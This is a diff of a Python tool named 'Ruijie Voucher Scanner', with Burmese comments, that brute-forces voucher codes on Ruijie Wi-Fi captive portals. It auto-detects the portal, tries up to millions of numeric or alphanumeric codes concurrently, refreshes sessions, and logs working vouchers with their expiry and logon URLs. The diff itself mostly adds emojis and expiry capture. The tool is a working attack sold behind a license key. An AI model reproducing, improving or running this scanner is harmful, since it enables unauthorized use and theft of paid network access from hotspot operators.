@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Ruijie Voucher Scanner - KHANTv8.3 (Part 1)
-- V6 License Integration & Clean Setup
+- V6 License Integration & Clean Setup with Emojis
 """
 
 import os
@@ -46,23 +46,23 @@ def verify_and_enforce_license():
 
     device_id = _get_device_id()
     print("=" * 50)
-    print("         KHANTv8.3 - LICENSE ACTIVATION         ")
+    print("         🔒 KHANTv8.3 - LICENSE ACTIVATION         ")
     print("=" * 50)
-    print(f"Device ID: {device_id}")
-    print(f"Status   : {msg}")
+    print(f"📱 Device ID: {device_id}")
+    print(f"📌 Status   : {msg}")
     print("-" * 50)
     
-    entered_key = input("Enter License Key (V6-KAVIN-...): ").strip()
+    entered_key = input("🔑 Enter License Key (V6-KAVIN-...): ").strip()
     if not entered_key:
-        print("[-] Key မထည့်ပါ။ ပိတ်လိုက်ပါပြီ။")
+        print("❌ Key မထည့်ပါ။ ပိတ်လိုက်ပါပြီ။")
         sys.exit(1)
         
     success, act_msg = activate(entered_key)
     if success:
-        print(f"[+] {act_msg}")
+        print(f"✅ {act_msg}")
         time.sleep(1.5)
     else:
-        print(f"[-] Activation Failed: {act_msg}")
+        print(f"❌ Activation Failed: {act_msg}")
         time.sleep(2)
         sys.exit(1)
 
@@ -114,7 +114,7 @@ def get_timestamp():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 def auto_detect_portal():
-    print("[*] Auto detecting portal URL...")
+    print("🌐 Auto detecting portal URL...")
     session = requests.Session()
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
     
@@ -223,13 +223,25 @@ class VoucherScanner:
         log_text.append(f"Progress: [{self.print_progress_bar(s['percentage'])}] {s['percentage']:.2f}%\n")
         layout["logs"].update(Panel(log_text, title="Progress & Hit Plan", border_style="blue", box=ROUNDED))
 
+        # Hits Table - ကုဒ်နှင့်အတူ သက်တမ်း (Expiry/Duration) ပါ ပေါ်စေရန်
         hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
         hits_table.add_column("Type", width=8, justify="center")
-        hits_table.add_column("Voucher", justify="center")
+        hits_table.add_column("Voucher Code", justify="center")
+        hits_table.add_column("Validity / Expiry Info", justify="center")
         
-        for v in s['found']: hits_table.add_row("[bold green]FOUND[/bold green]", v)
-        for v in s['valid']: hits_table.add_row("[green]VALID[/green]", v)
-        if not s['found'] and not s['valid']: hits_table.add_row("", "[dim]No real hits yet...[/dim]")
+        for item in s['found']:
+            # item တွင် [voucher, expiry_info] ပုံစံဖြင့် ဝင်လာမည်
+            v_code = item[0] if isinstance(item, list) else item
+            v_info = item[1] if isinstance(item, list) else "Active / Found"
+            hits_table.add_row("[bold green]FOUND[/bold green]", v_code, f"[cyan]{v_info}[/cyan]")
+            
+        for item in s['valid']:
+            v_code = item[0] if isinstance(item, list) else item
+            v_info = item[1] if isinstance(item, list) else "Valid"
+            hits_table.add_row("[green]VALID[/green]", v_code, f"[cyan]{v_info}[/cyan]")
+
+        if not s['found'] and not s['valid']: 
+            hits_table.add_row("", "[dim]No real hits yet...[/dim]", "")
 
         layout["hits"].update(Panel(hits_table, title=f"Real Hits Plan (F: {len(s['found'])} | V: {len(s['valid'])})", border_style="cyan", box=ROUNDED))
         return layout
@@ -331,13 +343,20 @@ class VoucherScanner:
                         await self.get_session_id(session, force_refresh=True)
                         continue
 
-                    if result.get("success") is True and isinstance(result.get("result"), dict):
-                        logon_url = result["result"].get("logonUrl")
-                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")
+                    # Server မှ ပေးလိုက်သော Result အသေးစိတ် (သက်တမ်း/Duration/Time) များကို ဖမ်းယူခြင်း
+                    res_data = result.get("result", {})
+                    if result.get("success") is True and isinstance(res_data, dict):
+                        logon_url = res_data.get("logonUrl")
+                        # API ထဲပါလာနိုင်သော သက်တမ်း သို့မဟုတ် အချိန်အချက်အလက်များကို ရှာဖွေခြင်း
+                        validity_info = res_data.get("expireTime") or res_data.get("duration") or res_data.get("leftTime") or "Active"
+                        return ('FOUND', logon_url, validity_info) if logon_url else ('VALID', None, validity_info)
                     
                     if '"result":0' in text or '"error":null' in text:
-                        logon_url = result.get("result", {}).get("logonUrl") if isinstance(result.get("result"), dict) else None
-                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")
+                        validity_info = "Valid Hit"
+                        if isinstance(res_data, dict):
+                            validity_info = res_data.get("expireTime") or res_data.get("duration") or "Valid Hit"
+                        logon_url = res_data.get("logonUrl") if isinstance(res_data, dict) else None
+                        return ('FOUND', logon_url, validity_info) if logon_url else ('VALID', None, validity_info)
 
                     return 'INVALID', None, message
             except:
@@ -345,11 +364,11 @@ class VoucherScanner:
                 await asyncio.sleep(0.2)
         return 'INVALID', None, "Max retries"
 
-    def save_found(self, voucher: str, status: str, logon_url: str = ""):
+    def save_found(self, voucher: str, status: str, expiry_info: str = "", logon_url: str = ""):
         ts = get_timestamp()
         with open("found_khant_v8.3.txt", "a") as f:
-            if status == "FOUND": f.write(f"[{ts}] {voucher} -> {logon_url}\n")
-            elif status == "VALID": f.write(f"[{ts}] {voucher} -> VALID\n")
+            if status == "FOUND": f.write(f"[{ts}] Code: {voucher} | Expiry: {expiry_info} | URL: {logon_url}\n")
+            elif status == "VALID": f.write(f"[{ts}] Code: {voucher} | Expiry: {expiry_info} -> VALID\n")
 
     async def run_phase(self, session, total_codes, length):
         self._state.update({
@@ -380,11 +399,12 @@ class VoucherScanner:
                     
                     for v, res in results:
                         tested_count += 1
-                        status, logon_url, _ = res
+                        status, logon_url, expiry_info = res
                         
                         if status in ['FOUND', 'VALID']:
-                            self._state['found' if status == 'FOUND' else 'valid'].append(v)
-                            self.save_found(v, status, logon_url)
+                            hit_entry = [v, str(expiry_info)]
+                            self._state['found' if status == 'FOUND' else 'valid'].append(hit_entry)
+                            self.save_found(v, status, str(expiry_info), logon_url or "")
                             self.session_valid = False
                             await self.get_session_id(session, force_refresh=True)
 
@@ -398,7 +418,7 @@ class VoucherScanner:
         finally:
             self._display_active = False
             self._live.stop()
-            print("\n[+] Scan finished & hit plan executed!")
+            print("\n✨ Scan finished & hit plan executed!")
 
 async def main():
     verify_and_enforce_license()
@@ -409,17 +429,17 @@ async def main():
     portal_url = auto_detect_portal()
     if portal_url:
         scanner.apply_params_from_url(portal_url)
-        print("[+] Portal URL fetched successfully!")
+        print("🔗 Portal URL fetched successfully!")
     else:
-        url_input = input("Enter Portal URL: ").strip()
+        url_input = input("🌐 Enter Portal URL: ").strip()
         if not url_input: return
         scanner.apply_params_from_url(url_input)
 
-    print("\n--- Choose Scan Type ---")
-    print("1. Number (0-9)")
-    print("2. English (a-z)")
-    print("3. Mixed (a-z + 0-9)")
-    scan_type = input("Select (1/2/3) [1]: ").strip()
+    print("\n--- ⚙️ Choose Scan Type ---")
+    print("1. 🔢 Number (0-9)")
+    print("2. 🔤 English (a-z)")
+    print("3. 🔀 Mixed (a-z + 0-9)")
+    scan_type = input("👉 Select (1/2/3) [1]: ").strip()
     
     if scan_type == "2":
         scanner.mode = "eng"
@@ -428,12 +448,12 @@ async def main():
     else:
         scanner.mode = "num"
 
-    print("\n--- Choose Voucher Length ---")
-    print("1. 6 digits")
-    print("2. 7 digits")
-    print("3. 8 digits")
-    print("4. 9 digits")
-    len_choice = input("Select (1/2/3/4) [1]: ").strip()
+    print("\n--- 📏 Choose Voucher Length ---")
+    print("1. 6 🔢 digits")
+    print("2. 7 🔢 digits")
+    print("3. 8 🔢 digits")
+    print("4. 9 🔢 digits")
+    len_choice = input("👉 Select (1/2/3/4) [1]: ").strip()
     
     length_map = {"1": 6, "2": 7, "3": 8, "4": 9}
     length = length_map.get(len_choice, 6)
@@ -441,18 +461,18 @@ async def main():
     totals = {6: 100000, 7: 500000, 8: 1000000, 9: 5000000}
     total_codes = totals.get(length, 100000)
 
-    print(f"\n[+] Selected Length: {length} | Total Codes: {total_codes:,}")
-    input("[*] Press Enter to start scanning...")
+    print(f"\n🚀 Selected Length: {length} | Total Codes: {total_codes:,}")
+    input("⚡ Press Enter to start scanning...")
 
     async with aiohttp.ClientSession() as session:
         await scanner.run_phase(session, total_codes, length)
 
-    input("\n[*] Press Enter to exit...")
+    input("\n👋 Press Enter to exit...")
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n[!] Interrupted by user")
+        print("\n⚠️ Interrupted by user")
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"❌ Error: {e}")
